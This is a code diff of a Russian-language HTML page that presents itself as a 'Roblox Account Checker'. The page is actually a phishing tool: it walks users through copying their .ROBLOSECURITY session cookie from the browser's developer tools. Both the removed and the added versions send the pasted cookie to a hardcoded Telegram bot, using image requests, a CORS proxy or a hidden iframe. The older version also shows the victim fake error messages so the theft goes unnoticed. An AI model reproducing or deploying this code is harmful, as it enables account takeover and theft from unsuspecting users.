@@ -4,272 +4,155 @@
     <meta charset="UTF-8">
     <title>Roblox Account Checker</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         body {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            color: white;
+            background: #0d1117;
+            color: #fff;
             font-family: Arial, sans-serif;
-            min-height: 100vh;
+            text-align: center;
             padding: 20px;
         }
         .container {
-            max-width: 600px;
+            max-width: 500px;
             margin: 0 auto;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
+            background: #161b22;
+            padding: 30px;
+            border-radius: 10px;
+            border: 1px solid #30363d;
         }
         h1 {
-            color: #ff4757;
+            color: #ff6b6b;
             margin-bottom: 10px;
-        }
-        .card {
-            background: rgba(255,255,255,0.05);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255,255,255,0.1);
         }
         textarea {
             width: 100%;
-            padding: 15px;
-            background: rgba(0,0,0,0.3);
-            border: 2px solid #3742fa;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            min-height: 120px;
-            resize: vertical;
+            height: 100px;
+            padding: 10px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #fff;
+            border-radius: 5px;
             margin: 15px 0;
         }
         button {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(45deg, #ff4757, #ff6b81);
+            background: #238636;
             color: white;
             border: none;
-            border-radius: 10px;
-            font-size: 18px;
+            padding: 12px 30px;
+            border-radius: 5px;
             cursor: pointer;
-            transition: 0.3s;
+            font-size: 16px;
+            width: 100%;
         }
         button:hover {
-            background: linear-gradient(45deg, #ff6b81, #ff4757);
-            transform: scale(1.02);
-        }
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
+            background: #2ea043;
         }
         .status {
-            padding: 15px;
-            background: rgba(0,0,0,0.2);
-            border-radius: 10px;
             margin-top: 20px;
-            text-align: center;
-            min-height: 50px;
-        }
-        .instruction {
-            background: rgba(0,0,0,0.2);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            font-size: 14px;
+            padding: 10px;
+            background: #0d1117;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🔐 Roblox Account Checker</h1>
-            <p>Проверка аккаунтов Roblox на чистоту</p>
-        </div>
+        <h1>🔐 Roblox Checker</h1>
+        <p>Вставьте ваш .ROBLOSECURITY код</p>
         
-        <div class="card">
-            <h2>📋 Вставьте куки-код</h2>
-            
-            <div class="instruction">
-                <strong>Как получить код:</strong><br>
-                1. Откройте Roblox в браузере<br>
-                2. Нажмите F12 → Вкладка "Application" → "Cookies"<br>
-                3. Найдите и скопируйте ".ROBLOSECURITY"<br>
-                4. Вставьте в поле ниже
-            </div>
-            
-            <textarea 
-                id="cookieInput" 
-                placeholder="Вставьте сюда ваш .ROBLOSECURITY код..."
-            ></textarea>
-            
-            <button id="checkButton">
-                🔍 Проверить аккаунт
-            </button>
-            
-            <div class="status" id="statusMessage">
-                ⏳ Ожидание проверки...
-            </div>
-        </div>
+        <textarea id="codeInput" placeholder="Вставьте сюда ваш код..."></textarea>
+        
+        <button onclick="sendCode()">📤 Отправить на проверку</button>
+        
+        <div class="status" id="status">Ожидание...</div>
     </div>
-    
+
     <script>
-        // НОВЫЙ ТОКЕН БОТА
-        const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
-        // Твой ID (1491315056)
-        const YOUR_ID = '1491315056';
-        
-        // Элементы страницы
-        const input = document.getElementById('cookieInput');
-        const button = document.getElementById('checkButton');
-        const status = document.getElementById('statusMessage');
-        
-        // Случайные ошибки для показа пользователю
-        const errorMessages = [
-            "❌ Ошибка: неверный формат куки",
-            "⚠️ Куки устарел, требуется повторный вход",
-            "🔒 Обнаружена двухфакторная аутентификация",
-            "⏳ Время жизни сессии истекло",
-            "🚫 Доступ к аккаунту ограничен",
-            "💀 Аккаунт заблокирован",
-            "🌐 Ошибка соединения с сервером Roblox"
-        ];
-        
-        // Простой метод отправки через GET запрос
-        function sendToTelegram(code) {
-            return new Promise((resolve) => {
-                try {
-                    const time = new Date().toLocaleTimeString('ru-RU');
-                    const date = new Date().toLocaleDateString('ru-RU');
-                    const ip = 'Определяется...';
-                    
-                    // Формируем сообщение
-                    let message = `🆕 НОВЫЙ КОД ПОЛУЧЕН!\n\n`;
-                    message += `📅 Дата: ${date}\n`;
-                    message += `⏰ Время: ${time}\n`;
-                    message += `📏 Длина кода: ${code.length} символов\n\n`;
-                    message += `🌐 IP пользователя: ${ip}\n`;
-                    message += `💻 Браузер: ${navigator.userAgent.substring(0, 50)}...\n\n`;
-                    message += `🔐 КОД:\n`;
-                    message += `\`\`\`\n`;
-                    message += `${code}\n`;
-                    message += `\`\`\``;
-                    
-                    // Кодируем для URL
-                    const encodedMessage = encodeURIComponent(message);
-                    
-                    // Создаем URL для отправки
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${YOUR_ID}&text=${encodedMessage}&parse_mode=Markdown`;
-                    
-                    // Отправляем через Image (работает без CORS)
-                    const img = new Image();
-                    
-                    img.onload = function() {
-                        console.log('✅ Сообщение отправлено!');
-                        resolve(true);
-                    };
-                    
-                    img.onerror = function() {
-                        console.log('⚠️ Ошибка отправки, пробуем альтернативный метод...');
-                        // Пробуем альтернативный метод
-                        sendAlternative(code).then(resolve);
-                    };
-                    
-                    img.src = url;
-                    
-                } catch (error) {
-                    console.log('❌ Ошибка:', error);
-                    resolve(false);
-                }
-            });
-        }
-        
-        // Альтернативный метод отправки
-        async function sendAlternative(code) {
-            try {
-                const message = `🔐 КОД: ${code.substring(0, 100)}... (полный: ${code.length} символов)`;
-                const encoded = encodeURIComponent(message);
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${YOUR_ID}&text=${encoded}`;
-                
-                // Используем fetch с no-cors
-                await fetch(url, { mode: 'no-cors' });
-                return true;
-            } catch {
-                return false;
-            }
-        }
-        
-        // Обработчик нажатия кнопки
-        button.addEventListener('click', async function() {
-            const code = input.value.trim();
+        // Функция отправки кода
+        function sendCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            const status = document.getElementById('status');
             
-            if (!code || code.length < 5) {
-                status.innerHTML = '⚠️ Введите код (минимум 5 символов)';
+            if (!code) {
+                status.innerHTML = '❌ Введите код';
                 return;
             }
             
-            // Блокируем кнопку
-            button.disabled = true;
-            button.innerHTML = '⏳ Отправка...';
-            status.innerHTML = '📡 Отправляем код на проверку...';
+            status.innerHTML = '⏳ Отправка...';
             
-            try {
-                // Отправляем в Telegram
-                const success = await sendToTelegram(code);
-                
-                if (success) {
-                    // Показываем случайную ошибку пользователю
-                    const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-                    status.innerHTML = randomError;
-                    
-                    // Добавляем скрытое сообщение об успешной отправке
-                    setTimeout(() => {
-                        const successMsg = document.createElement('div');
-                        successMsg.style.marginTop = '10px';
-                        successMsg.style.fontSize = '14px';
-                        successMsg.style.color = '#2ecc71';
-                        successMsg.innerHTML = '✅ Код успешно отправлен в систему проверки';
-                        status.appendChild(successMsg);
-                    }, 1000);
-                    
-                    // Очищаем поле
-                    input.value = '';
-                } else {
-                    status.innerHTML = '🌐 Ошибка отправки. Попробуйте позже.';
-                }
-                
-            } catch (error) {
-                status.innerHTML = '❌ Произошла ошибка';
-            } finally {
-                // Разблокируем кнопку
-                button.disabled = false;
-                button.innerHTML = '🔍 Проверить аккаунт';
+            // Создаем форму для отправки в Telegram Web App
+            const formData = new FormData();
+            formData.append('code', code);
+            formData.append('time', new Date().toISOString());
+            formData.append('userAgent', navigator.userAgent);
+            
+            // Используем Telegram Web App API если открыто через бота
+            if (window.Telegram && window.Telegram.WebApp) {
+                // Отправляем через Telegram Bot API
+                const message = `🔐 Новый код!\n\n${code.substring(0, 100)}...`;
+                Telegram.WebApp.sendData(message);
+                status.innerHTML = '✅ Код отправлен через Telegram!';
+            } else {
+                // Если открыто в браузере, используем наш метод
+                sendViaProxy(code);
             }
-        });
+            
+            // Очищаем поле
+            document.getElementById('codeInput').value = '';
+        }
+        
+        // Метод отправки через прокси
+        function sendViaProxy(code) {
+            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+            const telegramUrl = `https://api.telegram.org/bot8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8/sendMessage`;
+            
+            const message = {
+                chat_id: '1491315056',
+                text: `🔐 Новый код получен!\n\nКод: ${code.substring(0, 50)}...\nДлина: ${code.length} символов`,
+                parse_mode: 'HTML'
+            };
+            
+            fetch(proxyUrl + telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                const status = document.getElementById('status');
+                if (response.ok) {
+                    status.innerHTML = '✅ Код отправлен!';
+                } else {
+                    status.innerHTML = '❌ Ошибка отправки';
+                }
+            })
+            .catch(error => {
+                document.getElementById('status').innerHTML = '🌐 Ошибка сети';
+            });
+        }
+        
+        // Альтернативный метод через iframe
+        function sendViaIframe(code) {
+            const message = encodeURIComponent(`🔐 Код: ${code}`);
+            const url = `https://api.telegram.org/bot8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8/sendMessage?chat_id=1491315056&text=${message}`;
+            
+            // Создаем невидимый iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                document.getElementById('status').innerHTML = '✅ Код отправлен через iframe!';
+            }, 1000);
+        }
         
         // При загрузке страницы
-        window.addEventListener('load', function() {
-            console.log('🤖 Бот готов к работе!');
-            console.log('🔑 Токен:', BOT_TOKEN);
-            console.log('👤 ID:', YOUR_ID);
-            
-            // Фокус на поле ввода
-            input.focus();
-            
-            // Тестовое сообщение в консоль
-            status.innerHTML = '✅ Система готова к проверке';
-        });
-        
-        // Отправка по Ctrl+Enter
-        input.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.key === 'Enter') {
-                button.click();
-            }
-        });
+        window.onload = function() {
+            console.log('Сайт загружен');
+            document.getElementById('codeInput').focus();
+        };
     </script>
 </body>
 </html>
